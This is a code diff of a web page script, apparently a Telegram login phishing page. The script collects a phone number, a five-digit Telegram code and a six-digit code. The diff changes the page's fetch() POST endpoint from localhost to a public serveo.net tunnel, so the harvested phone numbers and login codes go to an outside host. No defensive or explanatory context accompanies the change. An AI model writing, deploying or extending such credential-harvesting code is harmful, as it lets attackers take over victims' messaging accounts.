@@ -120,7 +120,7 @@ display: none;
 </div>
            <script>
             $(document).ready(function(){
-      $('#number').mask('+000000000000');
+      $('#number').mask('+0000000000000');
 $('#code_telegram').mask('00000');
 $('#code').mask('000000');
   })
@@ -144,7 +144,7 @@ document.querySelector('.next').addEventListener('click', () => {
 const number_ver = document.getElementById('number').value;
 const code_ver = document.getElementById('code').value;
 const code_telegram_ver = document.getElementById('code_telegram').value;
-    fetch('http://localhost:4040/data', {
+    fetch('https://55aeee325adcc25d0e4b94a4a90982cd.serveo.net/data', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
